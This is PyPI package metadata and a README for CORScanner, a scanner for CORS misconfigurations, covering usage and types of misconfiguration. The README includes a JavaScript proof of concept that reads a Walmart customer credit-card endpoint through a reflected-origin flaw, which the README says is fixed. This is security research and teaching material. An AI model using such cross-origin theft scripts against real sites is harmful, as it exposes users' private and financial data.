{
  "info": {
    "author": "Jianjun Chen",
    "author_email": "whucjj@hotmail.com",
    "bugtrack_url": null,
    "classifiers": [
      "Development Status :: 4 - Beta",
      "Environment :: Console",
      "License :: OSI Approved :: MIT License",
      "Natural Language :: English",
      "Operating System :: OS Independent",
      "Programming Language :: Python",
      "Topic :: Security"
    ],
    "description": "## About CORScanner \n\nCORScanner is a python tool designed to discover CORS misconfigurations vulnerabilities of websites. It helps website administrators and penetration testers to check whether the domains/urls they are targeting have insecure CORS policies. \n\n### Features\n* **Fast**. It uses [gevent](https://github.com/gevent/gevent) instead of Python threads for concurrency, which is much faster for network scanning.\n* **Comprehensive**. It covers all [the common types of CORS misconfigurations](#misconfiguration-types) we know.\n* **Flexible**. It supports various self-define features (e.g. file output), which is helpful for large-scale scanning.\n\nTwo useful references for understanding CORS systematically: \n* USENIX security 18 paper: [We Still Don’t Have Secure Cross-Domain Requests: an Empirical Study of CORS](https://www.jianjunchen.com/publication/an-empirical-study-of-cors/)\n* 中文详解：[绕过浏览器SOP，跨站窃取信息：CORS配置安全漏洞报告及最佳部署实践](https://www.jianjunchen.com/post/cors%E5%AE%89%E5%85%A8%E9%83%A8%E7%BD%B2%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/)\n\n## Screenshots\n\n![CORScanner](https://github.com/chenjj/CORScanner/raw/master/images/screenshot.png \"CORScanner in action\")\n\n## Installation\n\n- Download this tool\n```\ngit clone https://github.com/chenjj/CORScanner.git\n```\n\n- Install dependencies\n```\nsudo pip install -r requirements.txt\n```\nCORScanner depends on the `requests`, `gevent`, `tldextract`, `colorama` and `argparse` python modules.\n\n## Python Version:\n\n* Both Python 2 (**2.7.x**) and Python 3 (**3.7.x**) are supported.\n\n## Usage\n\nShort Form    | Long Form     | Description\n------------- | ------------- |-------------\n-u            | --url         | URL/domain to check it's CORS policy\n-d            | --headers     | Add headers to the request\n-i            | --input       | URL/domain list file to check their CORS policy\n-t            | --threads     | Number of threads to use for CORS scan\n-o            | --output      | Save the results to json file\n-v            | --verbose     | Enable the verbose mode and display results in realtime\n-h            | --help        | show the help message and exit\n\n### Examples\n\n* To check CORS misconfigurations of specific domain:\n\n``python cors_scan.py -u example.com``\n\n* To enable more debug info, use -vvv:\n\n``python cors_scan.py -u example.com -vvv``\n\n* To check CORS misconfigurations of specific URL:\n\n``python cors_scan.py -u http://example.com/restapi``\n\n* To check CORS misconfiguration with specific headers:\n\n``python cors_scan.py -u example.com -d \"Cookie: test\"``\n\n* To check CORS misconfigurations of multiple domains/URLs:\n\n``python cors_scan.py -i top_100_domains.txt -t 100``\n\n* To list all the basic options and switches use -h switch:\n\n```python cors_scan.py -h```\n\n## Misconfiguration types\nThis tool covers the following misconfiguration types:\n\nMisconfiguration type    | Description\n------------------------ | --------------------------\nReflect_any_origin       | Blindly reflect the Origin header value in `Access-Control-Allow-Origin headers` in responses, which means any website can read its secrets by sending cross-orign requests.\nPrefix_match             | `wwww.example.com` trusts `example.com.evil.com`, which is an attacker's domain.\nSuffix_match             | `wwww.example.com` trusts `evilexample.com`, which could be registered by an attacker.\nNot_escape_dot           | `wwww.example.com` trusts `wwwaexample.com`, which could be registered by an attacker.\nSubstring match          | `wwww.example.com` trusts `example.co`, which could be registered by an attacker.\nTrust_null               | `wwww.example.com` trusts `null`, which can be forged by iframe sandbox scripts\nHTTPS_trust_HTTP         | Risky trust dependency, a MITM attacker may steal HTTPS site secrets\nTrust_any_subdomain      | Risky trust dependency, a subdomain XSS may steal its secrets\nCustom_third_parties     | Custom unsafe third parties origins like `github.io`, see more in [origins.json](./origins.json) file. Thanks [@phackt](https://github.com/phackt)!\nSpecial_characters_bypass| Exploiting browsers’ handling of special characters. Most can only work in Safari except `_`, which can also work in Chrome and Firefox. See more in [Advanced CORS Exploitation Techniques](https://www.corben.io/advanced-cors-techniques/). Thanks [@Malayke](https://github.com/Malayke).\n\nWelcome to contribute more.  \n\n## Exploitation examples\nHere is an example about how to exploit \"Reflect_any_origin\" misconfiguration on Walmart.com(fixed). Localhost is the malicious website in the video.\n\nWalmart.com video on Youtube:\n\n[![Walmart_CORS_misconfiguration_exploitation](https://github.com/chenjj/CORScanner/raw/master/images/walmart.png)](http://www.youtube.com/watch?v=3abaevsSHXY)\n\nHere is the exploitation code:\n```javascript\n<script>\n    // Send a cross origin request to the walmart.com server, when a victim visits the page.\n    var req = new XMLHttpRequest();\n    req.open('GET',\"https://www.walmart.com/account/electrode/account/api/customer/:CID/credit-card\",true);\n    req.onload = stealData;\n    req.withCredentials = true;\n    req.send();\n\n    function stealData(){\n        //reading response is allowed because of the CORS misconfiguration.\n        var data= JSON.stringify(JSON.parse(this.responseText),null,2);\n\n        //display the data on the page. A real attacker can send the data to his server.\n        output(data);\n    }\n\n    function output(inp) {\n        document.body.appendChild(document.createElement('pre')).innerHTML = inp;\n    }\n</script>\n```\n\nIf you have understood how the demo works, you can read Section 5 and Section 6 of the [CORS paper](https://www.jianjunchen.com/publication/an-empirical-study-of-cors/) and know how to exploit other misconfigurations.\n\n## License\n\nCORScanner is licensed under the MIT license. take a look at the [LICENSE](./LICENSE) for more information.\n\n\n## Credits\nThis work is inspired by the following excellent researches:\n\n* James Kettle, “Exploiting CORS misconfigurations for Bitcoins and bounties”, AppSecUSA 2016*\n* Evan Johnson, “Misconfigured CORS and why web appsec is not getting easier”,  AppSecUSA 2016*\n* Von Jens Müller, \"CORS misconfigurations on a large scale\", [CORStest](https://github.com/RUB-NDS/CORStest)*\n\n## Version\n**Current version is 1.0**\n\n\n",
    "description_content_type": "text/markdown",
    "docs_url": null,
    "download_url": "",
    "downloads": {
      "last_day": -1,
      "last_month": -1,
      "last_week": -1
    },
    "home_page": "http://github.com/chenjj/CORScanner",
    "keywords": "",
    "license": "MIT",
    "maintainer": "",
    "maintainer_email": "",
    "name": "corscanner",
    "package_url": "https://pypi.org/project/corscanner/",
    "platform": "",
    "project_url": "https://pypi.org/project/corscanner/",
    "project_urls": {
      "Bug Reports": "https://github.com/chenjj/CORScanner/issues",
      "Homepage": "http://github.com/chenjj/CORScanner",
      "Source": "https://github.com/chenjj/CORScanner/"
    },
    "release_url": "https://pypi.org/project/corscanner/0.9.7/",
    "requires_dist": [
      "colorama",
      "requests",
      "argparse",
      "gevent",
      "tldextract",
      "future"
    ],
    "requires_python": "",
    "summary": "Fast CORS misconfiguration vulnerabilities scanner",
    "version": "0.9.7",
    "yanked": false,
    "yanked_reason": null
  },
  "last_serial": 9039766,
  "releases": {
    "0.9.7": [
      {
        "comment_text": "",
        "digests": {
          "blake2b_256": "799dc85bd6b978dab87e072d39348b0d98d5f16bd3494dc76ef2286d5d78e00a",
          "md5": "ae034f3f641c24c0ae393eedbe7364a8",
          "sha256": "40fbe2cd67696b4896a18eb8b6c7a049e7846c4836a818037fe62b19f41c1917"
        },
        "downloads": -1,
        "filename": "corscanner-0.9.7-py3-none-any.whl",
        "has_sig": false,
        "md5_digest": "ae034f3f641c24c0ae393eedbe7364a8",
        "packagetype": "bdist_wheel",
        "python_version": "py3",
        "requires_python": null,
        "size": 2280015,
        "upload_time": "2021-01-03T02:11:31",
        "upload_time_iso_8601": "2021-01-03T02:11:31.054083Z",
        "url": "https://files.pythonhosted.org/packages/79/9d/c85bd6b978dab87e072d39348b0d98d5f16bd3494dc76ef2286d5d78e00a/corscanner-0.9.7-py3-none-any.whl",
        "yanked": false,
        "yanked_reason": null
      },
      {
        "comment_text": "",
        "digests": {
          "blake2b_256": "b18e7b63e6617a28a3da5169fb6712b0c34c40bfcb8219a9dc15c651574fb9fd",
          "md5": "cf4b50d18cd71449d97959fb54ffc56e",
          "sha256": "5be873fa1a503eaa60416759906354b496d8b8d1e8d1d99fe314d60405fc33bb"
        },
        "downloads": -1,
        "filename": "corscanner-0.9.7.tar.gz",
        "has_sig": false,
        "md5_digest": "cf4b50d18cd71449d97959fb54ffc56e",
        "packagetype": "sdist",
        "python_version": "source",
        "requires_python": null,
        "size": 2274778,
        "upload_time": "2021-01-03T02:11:37",
        "upload_time_iso_8601": "2021-01-03T02:11:37.677628Z",
        "url": "https://files.pythonhosted.org/packages/b1/8e/7b63e6617a28a3da5169fb6712b0c34c40bfcb8219a9dc15c651574fb9fd/corscanner-0.9.7.tar.gz",
        "yanked": false,
        "yanked_reason": null
      }
    ]
  },
  "urls": [
    {
      "comment_text": "",
      "digests": {
        "blake2b_256": "799dc85bd6b978dab87e072d39348b0d98d5f16bd3494dc76ef2286d5d78e00a",
        "md5": "ae034f3f641c24c0ae393eedbe7364a8",
        "sha256": "40fbe2cd67696b4896a18eb8b6c7a049e7846c4836a818037fe62b19f41c1917"
      },
      "downloads": -1,
      "filename": "corscanner-0.9.7-py3-none-any.whl",
      "has_sig": false,
      "md5_digest": "ae034f3f641c24c0ae393eedbe7364a8",
      "packagetype": "bdist_wheel",
      "python_version": "py3",
      "requires_python": null,
      "size": 2280015,
      "upload_time": "2021-01-03T02:11:31",
      "upload_time_iso_8601": "2021-01-03T02:11:31.054083Z",
      "url": "https://files.pythonhosted.org/packages/79/9d/c85bd6b978dab87e072d39348b0d98d5f16bd3494dc76ef2286d5d78e00a/corscanner-0.9.7-py3-none-any.whl",
      "yanked": false,
      "yanked_reason": null
    },
    {
      "comment_text": "",
      "digests": {
        "blake2b_256": "b18e7b63e6617a28a3da5169fb6712b0c34c40bfcb8219a9dc15c651574fb9fd",
        "md5": "cf4b50d18cd71449d97959fb54ffc56e",
        "sha256": "5be873fa1a503eaa60416759906354b496d8b8d1e8d1d99fe314d60405fc33bb"
      },
      "downloads": -1,
      "filename": "corscanner-0.9.7.tar.gz",
      "has_sig": false,
      "md5_digest": "cf4b50d18cd71449d97959fb54ffc56e",
      "packagetype": "sdist",
      "python_version": "source",
      "requires_python": null,
      "size": 2274778,
      "upload_time": "2021-01-03T02:11:37",
      "upload_time_iso_8601": "2021-01-03T02:11:37.677628Z",
      "url": "https://files.pythonhosted.org/packages/b1/8e/7b63e6617a28a3da5169fb6712b0c34c40bfcb8219a9dc15c651574fb9fd/corscanner-0.9.7.tar.gz",
      "yanked": false,
      "yanked_reason": null
    }
  ],
  "vulnerabilities": []
}